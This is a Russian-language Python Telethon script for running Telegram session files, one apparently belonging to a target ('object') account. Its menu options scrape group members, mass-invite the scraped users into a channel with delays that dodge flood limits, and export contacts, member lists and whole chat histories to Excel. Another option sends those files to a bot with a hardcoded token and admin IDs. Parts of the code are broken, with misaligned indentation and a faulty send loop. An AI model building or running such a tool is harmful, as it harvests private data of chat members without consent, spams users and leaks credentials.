from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from defunc import *
from groups import *
import time
import random
import os
import openpyxl
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import GetContactsRequest
import asyncio  # Add this import statement at the beginning of your script
import telebot
from telethon.tl.types import Chat, Channel
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
    
# Инициализация Telegram-бота
bot = telebot.TeleBot("7177580903:AAGMpLN2UH-csFThYwl_IZfZF9vGAgAjMOk")
admin_chat_ids = ["1300172545", "145644974"]
if __name__ == "__main__":
    while True:
        options = getoptions()
        if not options or options[0] == "NONEID\n" or options[1] == "NONEHASH\n":
            print("Добавьте API_ID и API_HASH")
            time.sleep(2)
            config()
            continue
        
        api_id = int(options[0].replace('\n', ''))
        api_hash = str(options[1].replace('\n', ''))
        if options[2] == 'True\n':
            user_id = True
        else:
            user_id = False
        if options[3] == 'True\n':
            user_name = True
        else:
            user_name = False

        os.system('cls||clear')
        print('\033[37mЕсли приложение вылетает с ошибкой - просто перезапустите программу\033[0m')
        print () 
        selection = str(input(f"{color.PURPLE}1 - Настройки{color.END}\n"
                            "\n" 
                            f"{color.BLUE}2 - Спарсить участников групп{color.END}\n"
                            f"{color.BLUE}3 - Инвайтинг в группы{color.END}\n"
                            "\n"
                            f"\033[4m{color.CYAN}Выгрузить в EXCEL:{color.END}\033[0m\n"
                            f"{color.DARKCYAN}4 - Информация о каналах и группах{color.END}\n"
                            f"{color.DARKCYAN}5 - Список сохраненных контактов{color.END}\n"
                            f"{color.DARKCYAN}6 - Участники чата{color.END}\n"
                            f"{color.DARKCYAN}7 - Сообщения чата{color.END}\n"  
                            "\n"  
                            f"{color.YELLOW}8 - Отправить полученные файлы excel в бот{color.END}\n"
                            "\n"  
                            f"{color.RED}'e' - Выход{color.END}\n"
                            "\n"  
                            "\033[37mВвод: \033[0m"))

# 1 Настройки
        if selection == '1':
            config(api_id, api_hash) 


# 2 Парсинг участников чата в txt
        elif selection == '2':
            chats = []
            last_date = None    
            size_chats = 200
            groups = []         
            
            print("Выберите аккаунт объекта или юзербота для парсинга участников групп\n"
                "(Аккаунт, который состоит в группах, которые нужно спарсить)\n")
            
            sessions = []
            for file in os.listdir('.'):
                if file.endswith('.session'):
                    sessions.append(file)

            for i in range(len(sessions)):
                print(f"[{i}] -", sessions[i], '\n')
            i = int(input("Ввод: "))
            
            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash)
            client.connect()
           #.start(sessions[i].replace('\n', ''))

            result = client(GetDialogsRequest(
                offset_date=last_date,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=size_chats,
                hash=0
            ))
            chats.extend(result.chats)

            for chat in chats:
                try:
                    if chat.megagroup is True:
                        groups.append(chat)         
                except:
                    continue

            i = 0
            print('Очистка базы ранее сохраненных юзеров: clear') 
            print('-----------------------------')
            for g in groups:
                print(str(i) + ' - ' + g.title)
                i+=1
            print(str(i + 1) + ' - ' + 'Спарсить всё')
            g_index = str(input("Ввод: "))

            if g_index == 'clear':
                f = open('usernames.txt', 'w')
                f.close()
                f = open('userids.txt', 'w')
                f.close

            elif int(g_index) < i + 1:
                target_group = groups[int(g_index)]
                parsing(client, target_group, user_id, user_name)
                print('Спаршено.')
                time.sleep(3)

            elif int(g_index) == i + 1: #парсим со всех групп
                for g_index in groups:
                    parsing(client, g_index, user_id, user_name)
                print('Спаршено.')
                time.sleep(3)

# 3 Инвайтинг 
        elif selection == '3':
            with open('usernames.txt', 'r') as f:
                users = list(f)

            print("Выберите юзер-бота для инвайтинга.\n"
                "(Аккаунт который состоит в группе, в которую производится инвайт)")
            
            sessions = []
            for file in os.listdir('.'):
                if file.endswith('.session'):
                    sessions.append(file)

            for i in range(len(sessions)):
                print(f"{i} -", sessions[i])
            i = int(input("Ввод: "))
            
            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash)

            channelname = input('Введите имя канала для инвайта (без "@")')

            for limit in range(20):
                try:
                    inviting(client, channelname, users[limit].replace('\n', ''))
                    print(users[limit].replace('\n', ''))
                    time.sleep(random.randrange(15, 40))

                except UserPrivacyRestrictedError:
                    print('Пользователь ' + users[limit].replace('\n', '') + ' запретил его инвайтить. Пропускаем :(')

                except PeerFloodError:
                    print('Телеграмм заспамлен.')
                    break

                except Exception as error:
                    print(error)
                    break


       # 4 Выгрузить инфу об аккаунте
        elif selection == '4':
           channelandgroups(api_id, api_hash)

       
       # 5 Выгрузить список контактов в excel
        elif selection == '5':
            os.system('cls||clear')
            sessions = []
            for file in os.listdir('.'):
                if file.endswith('.session'):
                        sessions.append(file)
            while True:
                os.system('cls||clear')
                print('-----------------------------')
                print('=ВЫГРУЗКА КОНТАКТОВ В EXCEL=')
                print('-----------------------------')
                print()
                for i, session in enumerate(sessions):
                    print(f"[{i}] - {session}")
                print()
                user_input = input("Выберите существующий аккаунт для выгрузки имеющихся у него контактов в формате excel ('e' - назад): ")
                if user_input.lower() == 'e':
                    break
                else:
                    try:
                        session_index = int(user_input)
                        if 0 <= session_index < len(sessions):
                            client = TelegramClient(sessions[session_index].replace('\n', ''), api_id, api_hash)
                            client.connect()

                            # Получение информации о пользователе
                            me = client.get_me()
                            userid = me.id
                            firstname = me.first_name
                            username = f"@{me.username}" if me.username is not None else ""
                            lastname = me.last_name if me.last_name is not None else ""
                            phone = sessions[i].split('.')[0]
                            userinfo = f"(Номер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username})"

                            asyncio.get_event_loop().run_until_complete(get_contacts(client, sessions[session_index].replace('.session', ''), userid, userinfo))
                            os.system('cls||clear')
                            print('Список контактов выгружен в excel, мой командир')
                            client.disconnect()
                            time.sleep(3)
                            break
                        else:
                            print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                            time.sleep(2)
                    except ValueError:
                        print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                        time.sleep(2)
           
# 6 Выгрузить участников групп в excel
        elif selection == '6':
            os.system('cls||clear')
            chats = []
            last_date = None    
            size_chats = 200
            groups = []
            exit_flag = False

            while not exit_flag:
                os.system('cls||clear')
                sessions = [file for file in os.listdir('.') if file.endswith('.session')]

                for i in range(len(sessions)):
                    print(f"[{i}] - {sessions[i]}")
                print()
                
                user_input = input("Выберите существующий аккаунт для выгрузки участников чата в формате excel ('e' - назад): ")
                if user_input.lower() == 'e':
                    break
                else:
                    try:
                        i = int(user_input)
                        if 0 <= i < len(sessions):
                            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash)
                            client.connect()

                            # Получение информации о пользователе
                            me = client.get_me()
                            userid = me.id
                            firstname = me.first_name
                            username = f"@{me.username}" if me.username is not None else ""
                            lastname = me.last_name if me.last_name is not None else ""
                            phone = sessions[i].split('.')[0]

                           chats = client.get_dialogs()
                           for chat in chats:
                              if isinstance(chat.entity, Channel) or isinstance(chat.entity, Chat): #проверяем групповой ли чат
                                
                                 # Определяем открытый чат
                                  if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast'):
                                      if chat.entity.broadcast == False and chat.entity.username:
                                          groups.append(chat.entity)
                               
                               # Определяем закрытый чат
                                  if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast'):
                                      if chat.entity.broadcast == False and chat.entity.username == None:
                                          groups.append(chat.entity)
                                  if isinstance(chat.entity, Chat) and chat.entity.migrated_to is None:
                                      groups.append(chat.entity)    


                           
                            while True:
                                os.system('cls||clear')
                                i = 0
                                print('-----------------------------')
                                print('=ВЫГРУЗКА УЧАСТНИКОВ ЧАТА В EXCEL=')
                                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                                print('-----------------------------')
                              
                                for g in groups:
                                    username = g.username if g.username is not None else ""
                                    if g.creator:
                                       print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m' + color.RED + ' (Владелец)' + color.END + color.BLUE + ' @' + username + color.END)
                                    elif g.admin_rights is not None:
                                       print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m' + color.RED + ' (Есть права администратора)' + color.END)
                                    else:
                                        print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m')
                                    i += 1

                               
                                print()    
                                g_index_str = str(input("Выберите чат для получения списка его участников ('e' - назад): "))
                       
                                if g_index_str.lower() == 'e':
                                    client.disconnect()
                                    groups = []
                                    chats = []
                                    break
                                else:
                                    try:
                                        g_index = int(g_index_str)
                                        if 0 <= g_index < i:
                                            target_group = groups[int(g_index)]
                                            group_title = target_group.title
                                            group_id = target_group.id
                                            parsing_xlsx(client, target_group, user_id, user_name, group_title, group_id)
                                            os.system('cls||clear')
                                            print('Участники групп выгружены в excel, мой командир')
                                            client.disconnect()
                                            time.sleep(3)
                                            exit_flag = True
                                            break
                                        else:
                                            print("Пожалуйста, выберите группу из списка")
                                            time.sleep(2)
                                    except ValueError:
                                        print("Пожалуйста, выберите группу из списка")
                                        time.sleep(2)
                        else:
                            print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                            time.sleep(2)
                    except ValueError:
                        print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                        time.sleep(2)

# 7 Выгрузить сообщения чата в excel
        elif selection == '7':
            os.system('cls||clear')
            chats = []
            last_date = None    
            size_chats = 200
            groups = []
            exit_flag = False

            while not exit_flag:
                os.system('cls||clear')
                print()
                sessions = [file for file in os.listdir('.') if file.endswith('.session')]

                for i in range(len(sessions)):
                    print(f"[{i}] - {sessions[i]}")
                print()
                
                user_input = input("Выберите существующий аккаунт для выгрузки сообщений из чата в формате excel ('e' - назад): ")
                if user_input.lower() == 'e':
                    break
                else:
                    try:
                        i = int(user_input)
                        if 0 <= i < len(sessions):
                            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash)
                            client.connect()
                           
                            # Получение информации о пользователе
                            me = client.get_me()
                            userid = me.id
                            firstname = me.first_name
                            username = f"@{me.username}" if me.username is not None else ""
                            lastname = me.last_name if me.last_name is not None else ""
                            phone = sessions[i].split('.')[0]
                           
                            result = client(GetDialogsRequest(
                                offset_date=last_date,
                                offset_id=0,
                                offset_peer=InputPeerEmpty(),
                                limit=size_chats,
                                hash=0
                            ))
                            chats.extend(result.chats)

                            for chat in chats:
                                try:
                                    if isinstance(chat, Chat) and chat.migrated_to is None:
                                        groups.append(chat)
                                    if chat.megagroup:
                                        groups.append(chat)
                                except:
                                    continue
                            
                            while True:
                                os.system('cls||clear')
                                i = 0
                                print('-----------------------------')
                                print('=ВЫГРУЗКА СООБЩЕНИЙ ЧАТА В EXCEL=')
                                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                                print('-----------------------------')
                                for g in groups:
                                    if g.creator:
                                       print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m' + color.RED + ' (Владелец)' + color.END)
                                    elif g.admin_rights is not None:
                                       print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m' + color.RED + ' (Есть права администратора)' + color.END)
                                    else:
                                        print(str(i) + ' - ' + g.title + '\033[93m [' + str(g.participants_count) + ']\033[0m')
                                    i += 1
                                
                                print()   
                                g_index_str = str(input("Выберите чат для выгрузки всех сообщений из него ('e' - назад): "))
                       
                                if g_index_str.lower() == 'e':
                                    client.disconnect()
                                    groups = []
                                    chats = []
                                    break
                                else:
                                    try:
                                        g_index = int(g_index_str)
                                        if 0 <= g_index < i:
                                            target_group = groups[int(g_index)]
                                            group_title = target_group.title
                                            os.system('cls||clear')
                                            print('Может потребоваться значительное количество времени, заварите кофе...')
                                            parsing_messages(client, target_group, user_id, user_name, group_title)
                                            os.system('cls||clear')
                                            print('Сообщения чата выгружены в excel, мой командир')
                                            client.disconnect()
                                            time.sleep(3)
                                            exit_flag = True
                                            break
                                        else:
                                            print("Пожалуйста, выберите группу из списка")
                                            time.sleep(2)
                                    except ValueError:
                                        print("Пожалуйста, выберите группу из списка")
                                        time.sleep(2)
                        else:
                            print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                            time.sleep(2)
                    except ValueError:
                        print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                        time.sleep(2)
        
        


    
# 8 Отправка файлов
        elif selection == '8':
        # Отправляем файлы боту
            for admin_chat_id in admin_chat_ids:
                send_files_to_bot(bot, admin_chat_ids)
                print('Сделано, мой командир')
                time.sleep(3)
# Выход
        elif selection == 'e':
            break
